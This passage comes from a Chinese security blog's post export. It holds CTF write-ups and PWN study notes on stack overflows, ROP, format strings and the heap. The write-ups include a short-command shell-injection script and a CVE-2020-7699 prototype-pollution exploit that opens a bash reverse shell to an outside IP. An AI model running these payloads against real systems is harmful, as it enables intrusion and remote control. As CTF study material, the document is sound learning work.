class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>这个很郁闷，配置环境很长时间还是没能弄出来</p>
<h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>应该是国赛分区赛的题</p>
<h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><p>nginx反向代理配置错误</p>
<p>首先来学习一下ngnix</p>
<h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。</p>
<p>主要在三个方面</p>
<ul>
<li>反向代理</li>
<li>负载均衡</li>
<li>nginx特点</li>
</ul>
<p><strong>反向代理</strong></p>
<blockquote>
<p>先说正向代理</p>
<p>客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p>
</blockquote>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
<p>上面这个图就很形象了</p>
<p>多个客户端给服务器发送的请求，nginx服务器接收到之后，</p>
<p>按照一定的规则分发给了后端的业务处理服务器进行处理了。</p>
<p>此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色</p>
<p><strong>负载均衡</strong></p>
<p>在反向代理中</p>
<p>客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡</p>
<p><strong>ngnix配置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main                                # 全局配置</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginx工作模式配置</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # http设置</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # 服务器主机配置</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # 路由配置</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # 负载均衡配置</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现有目录穿越漏洞参考</p>
<p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
<p>/static../</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
<p>之后就是找cve了，比较菜，只能学习</p>
<p>cve-2020-7699</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
<p>之后反弹shell，执行命令。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Flag</title>
    <url>/2099/09/27/Flag/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
  </entry>
  <entry>
    <title>0day安全读书笔记</title>
    <url>/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>三个月一起读完0day安全，赶紧拿来读一读，随缘更新</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1>]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程核心原理读书笔记</title>
    <url>/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN学习</title>
    <url>/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
<p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
<p>大学中是研究深度还是广度，我可能还是需要选择一下</p>
<p>基本全是ppt截图</p>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -S a.c #生成汇编文件</span><br><span class="line">file a.s #查看文件类型  可以看见是ascii文本</span><br><span class="line">gcc a.s  #生成可执行文件</span><br><span class="line">file a.out #可以看见是可执行文件</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p>
<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p>
<h2 id="程序编译与链接"><a href="#程序编译与链接" class="headerlink" title="程序编译与链接"></a>程序编译与链接</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p>
<h2 id="程序装载与进程执行"><a href="#程序装载与进程执行" class="headerlink" title="程序装载与进程执行"></a>程序装载与进程执行</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p>
<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p>
<h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><strong>基本原理</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>返回地址为后门地址</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>返回地址为写入的shellcode的地址</p>
<p><strong>栈中写入shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p>
<p><strong>bss段写入shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p>
<h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p>
<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p>
<p><strong>调用构造</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>存放参数放入寄存器中</p>
<p>但超过6个就会放入栈中</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p>
<h1 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p>
<h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p>
<p>它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>
<p><strong>部分RELRO</strong> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。<br><strong>完全RELRO</strong> 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o a a.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
<h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>主要是保护栈区不可执行，通常在checksec中可以查看</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化，也很好理解，就是不想让你找到真正的内存地址</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p>
<p>改变值的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p><strong>ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。</strong></p>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值</strong>，</p>
<p>也称哨兵值，通俗理解，我们可以把它看成一个cookie</p>
<p>它是程序每次运行时随机产生的。</p>
<p>在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。<br>最近的 GCC 版本可能会试图自动插入这种溢出检测值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值</span><br><span class="line">gcc -fno-stack-protector -o a a.c //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>位置无关代码，负责代码段和数据段bss</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>控制ESP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p>
<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><strong>前提：有printf 且第一个参数可控</strong></p>
<ol>
<li>泄露栈内存</li>
<li>泄露任意地址内存</li>
<li>篡改栈内存</li>
<li>篡改任意地址内存</li>
</ol>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%x</span><br><span class="line">%p 打印栈上内容</span><br><span class="line">%s 打印栈上解析地址的内容</span><br><span class="line">%n 写内容(打印字节的个数)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p>
<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" alt="image-20201118173315748"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p>
<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><ul>
<li>逻辑链表：指针连起来,把同类的<code>chunk</code>连起来</li>
<li>物理链表：通过<code>size</code>域组织相邻<code>chunk</code>之间的关系，判断相邻是否为<code>free chunk</code>，若是，则合并</li>
</ul>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p>
<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p>
<p><code>pre size</code>:记录上一个free chunk的大小，若上一个chunk在用，则<code>pre size</code>将被合并</p>
<p><code>size</code>:整个chunk 的大小</p>
<p><strong>top chunk</strong></p>
<p>从操作系统批发的不分给用户的chunk</p>
<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p>
<p>large bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p>
<p>fast bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p>
<p><strong>pre size 复用</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p>
